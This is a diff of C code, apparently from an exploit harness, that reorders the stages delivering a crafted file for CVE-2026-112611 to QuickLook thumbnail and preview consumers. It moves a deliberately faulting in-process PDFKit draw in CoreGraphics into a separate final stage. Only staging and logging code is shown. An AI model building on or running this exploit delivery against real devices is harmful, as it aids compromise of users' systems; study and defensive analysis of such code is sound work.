@@ -513,11 +513,19 @@ static void jb_sandbox_baseline(void) {
 
 // ============================================================================
 // Entry
+//
+// Split in two. Everything that can die out of process runs early, the overflow
+// ladder in the middle, and the in-process PDFKit draw last: that draw is the
+// one that faults inside CoreGraphics on purpose, and even though the guard
+// keeps the process alive it leaves CG objects half-built. Keeping it at the
+// end means a launch still delivers its cross-process data before anything can
+// poison the address space.
 // ============================================================================
 
-void jb_section(void (*logcb)(const char *));
+void jb_consumers(void (*logcb)(const char *));
+void jb_pdfkit_stage(void (*logcb)(const char *));
 
-void jb_section(void (*logcb)(const char *)) {
+void jb_consumers(void (*logcb)(const char *)) {
     g_jb_log = logcb;
     jb_logf("[JB] === cross-process delivery for CVE-2026-112611 ===");
 
@@ -527,19 +535,12 @@ void jb_section(void (*logcb)(const char *)) {
     jb_logf("[JB] staged=%d", staged);
     if (staged == 0) {
         jb_logf("[JB] nothing to deliver — builder produced no file");
-        jb_logf("[JB] === delivery done ===");
+        jb_logf("[JB] === consumers done ===");
         return;
     }
 
     jb_baseline();
 
-    // Order matters. Every stage that can take the process down runs before the
-    // in-process PDFKit draw, because that draw is the one that faults inside
-    // CoreGraphics on purpose: cg_guard_call catches the SIGSEGV and longjmps
-    // out, but the CG/CGPDF objects it was in the middle of building are left
-    // live and half-initialised. Anything that touches CoreGraphics afterwards
-    // inherits that state. So the guarded fault goes last, and each stage names
-    // itself on both sides so a silent death is attributable from the log alone.
     jb_logf("[STG] >>> quicklook-thumbnail");
     jb_stage_quicklook();
     jb_logf("[STG] <<< quicklook-thumbnail calls=%d ok=%d fail=%d timeout=%d",
@@ -553,6 +554,13 @@ void jb_section(void (*logcb)(const char *)) {
     jb_logf("[STG] >>> quicklook-preview");
     jb_stage_preview();
     jb_logf("[STG] <<< quicklook-preview timeout=%d", g_jb_qlp_timeout);
+
+    jb_logf("[JB] === consumers done ===");
+}
+
+void jb_pdfkit_stage(void (*logcb)(const char *)) {
+    g_jb_log = logcb;
+    jb_logf("[JB] === in-process PDFKit draw ===");
 
     jb_logf("[STG] >>> pdfkit-inprocess");
     jb_stage_pdfkit();
